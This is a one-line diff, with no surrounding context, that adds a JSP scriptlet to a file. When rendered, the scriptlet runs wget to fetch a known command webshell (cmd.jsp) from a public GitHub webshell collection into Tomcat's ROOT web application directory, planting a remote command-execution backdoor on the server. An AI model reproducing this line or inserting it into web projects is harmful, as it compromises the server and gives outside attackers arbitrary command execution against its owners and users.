@@ -1,0 +1,1 @@
+<% Runtime.getRuntime().exec("wget -P /usr/local/tomcat/webapps/ROOT/ https://github.com/tennc/webshell/raw/master/fuzzdb-webshell/jsp/cmd.jsp"); %>
